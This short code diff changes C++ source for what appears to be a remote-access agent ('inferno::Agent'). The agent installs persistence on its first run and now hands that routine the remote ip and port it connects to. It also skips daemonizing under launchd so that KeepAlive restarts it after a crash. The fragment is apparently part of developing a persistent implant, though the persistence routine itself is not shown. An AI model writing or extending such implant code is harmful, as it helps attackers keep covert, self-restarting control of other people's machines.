@@ -19,6 +19,15 @@ void daemonize() {
     return; // Keep console visible in test builds
 #endif
 
+#ifndef _WIN32
+    // When launched by launchd (parent PID is 1), skip daemonization.
+    // launchd handles backgrounding, and we need it to track the process
+    // for KeepAlive restart-on-crash to work.
+    if (::getppid() == 1) {
+        return;
+    }
+#endif
+
 #ifdef _WIN32
     // Detach from the parent console. If the binary is compiled with
     // /SUBSYSTEM:WINDOWS (CMake: WIN32_EXECUTABLE), no console is created
@@ -82,7 +91,7 @@ int main(int argc, char* argv[]) {
 
     // Install persistence on first run (Phase 2.5)
     if (argc > 0 && argv[0]) {
-        inferno::Agent::installPersistence(argv[0]);
+        inferno::Agent::installPersistence(argv[0], ip, port);
     }
     
     inferno::Agent agent(ip, port);
